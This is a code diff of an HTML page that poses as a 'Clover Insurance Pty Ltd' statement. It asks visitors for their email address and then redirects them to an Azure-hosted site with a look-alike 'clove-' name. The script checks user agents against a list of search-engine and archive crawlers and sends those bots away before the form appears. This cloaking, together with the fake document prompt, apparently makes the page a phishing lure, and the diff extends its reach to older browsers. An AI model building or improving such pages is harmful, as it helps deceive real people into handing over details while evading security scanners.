@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Document Access</title>
     <style>
         #emailModal {
@@ -14,8 +15,6 @@
             height: 100%;
             background-color: rgba(0,0,0,0.7);
             z-index: 9999;
-            justify-content: center;
-            align-items: center;
         }
         .modal-content {
             background-color: #fff;
@@ -24,26 +23,38 @@
             width: 90%;
             max-width: 400px;
             box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            -webkit-transform: translate(-50%, -50%);
         }
         .modal-content h2 {
             margin-top: 0;
+            color: #333;
+            font-size: 20px;
+        }
+        .modal-content p {
+            color: #555;
+            margin-bottom: 15px;
         }
         .modal-content input {
-            width: 100%;
-            padding: 10px;
+            width: 94%;
+            padding: 10px 3%;
             margin: 10px 0;
-            box-sizing: border-box;
             border: 1px solid #ddd;
             border-radius: 4px;
+            font-size: 16px;
         }
         .modal-content button {
             background-color: #4CAF50;
             color: white;
-            padding: 10px 15px;
+            padding: 12px 15px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
             width: 100%;
+            font-size: 16px;
         }
         .modal-content button:hover {
             background-color: #45a049;
@@ -53,7 +64,7 @@
 <body>
     <div id="emailModal">
         <div class="modal-content">
-            <h2>Clover Insurance - Statement</h2>
+            <h2>Clover Insurance Pty Ltd - Statement</h2>
             <p>Please enter your email address to view this content:</p>
             <input type="email" id="userEmail" placeholder="your@email.com" required>
             <button id="submitEmail">Continue</button>
@@ -61,18 +72,22 @@
     </div>
 
     <script>
-        // Anti-crawler measures
-        const isLikelyCrawler = () => {
-            // Check for common crawler user agents
-            const crawlerPatterns = [
+        // Anti-crawler measures - compatible with older browsers
+        function isLikelyCrawler() {
+            var crawlerPatterns = [
                 /bot/, /spider/, /crawl/, /slurp/, /search/, /archiver/,
                 /facebookexternalhit/, /linkedinbot/, /embedly/, /quora/,
                 /pinterest/, /twitterbot/, /googlebot/, /bingbot/, /yandexbot/,
                 /baiduspider/, /duckduckbot/, /sogou/, /exabot/, /ia_archiver/
             ];
             
-            const userAgent = navigator.userAgent.toLowerCase();
-            return crawlerPatterns.some(pattern => pattern.test(userAgent));
+            var userAgent = navigator.userAgent.toLowerCase();
+            for (var i = 0; i < crawlerPatterns.length; i++) {
+                if (crawlerPatterns[i].test(userAgent)) {
+                    return true;
+                }
+            }
+            return false;
         };
 
         // Check if this is likely a crawler
@@ -80,21 +95,26 @@
             // Redirect crawlers immediately without showing the modal
             window.location.href = "https://clove-eze8h0exdzd4fmaa.australiasoutheast-01.azurewebsites.net/";
         } else {
-            // Show the email modal for human users
-            document.addEventListener('DOMContentLoaded', function() {
-                const modal = document.getElementById('emailModal');
-                const emailInput = document.getElementById('userEmail');
-                const submitBtn = document.getElementById('submitEmail');
+            // Show the email modal for human users - with older browser support
+            function initModal() {
+                var modal = document.getElementById('emailModal');
+                var emailInput = document.getElementById('userEmail');
+                var submitBtn = document.getElementById('submitEmail');
                 
                 // Show modal
-                modal.style.display = 'flex';
+                modal.style.display = 'block';
+                
+                // Email validation function
+                function validateEmail(email) {
+                    var re = /^[^@]+@[^@]+\.[^@]+$/;
+                    return re.test(email);
+                }
                 
                 // Handle form submission
-                submitBtn.addEventListener('click', function() {
-                    const email = emailInput.value.trim();
+                function handleSubmit() {
+                    var email = emailInput.value.trim();
                     
-                    // Simple email validation
-                    if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    if (email && validateEmail(email)) {
                         // Here you could send the email to your server for tracking
                         console.log('User email:', email);
                         
@@ -102,16 +122,41 @@
                         window.location.href = "https://clove-eze8h0exdzd4fmaa.australiasoutheast-01.azurewebsites.net/";
                     } else {
                         alert('Please enter a valid email address.');
+                        emailInput.focus();
                     }
-                });
+                }
                 
-                // Also allow Enter key to submit
-                emailInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        submitBtn.click();
+                // Event listeners with fallbacks
+                if (submitBtn.addEventListener) {
+                    submitBtn.addEventListener('click', handleSubmit);
+                    emailInput.addEventListener('keypress', function(e) {
+                        if (e.key === 'Enter') {
+                            handleSubmit();
+                        }
+                    });
+                } else if (submitBtn.attachEvent) { // For IE8 and earlier
+                    submitBtn.attachEvent('onclick', handleSubmit);
+                    emailInput.attachEvent('onkeypress', function(e) {
+                        e = e || window.event;
+                        if (e.key === 'Enter') {
+                            handleSubmit();
+                        }
+                    });
+                }
+            }
+            
+            // DOM ready check with fallbacks
+            if (document.readyState === 'complete' || document.readyState === 'interactive') {
+                setTimeout(initModal, 1);
+            } else if (document.addEventListener) {
+                document.addEventListener('DOMContentLoaded', initModal);
+            } else { // For IE8 and earlier
+                document.attachEvent('onreadystatechange', function() {
+                    if (document.readyState === 'complete') {
+                        initModal();
                     }
                 });
-            });
+            }
         }
     </script>
 </body>
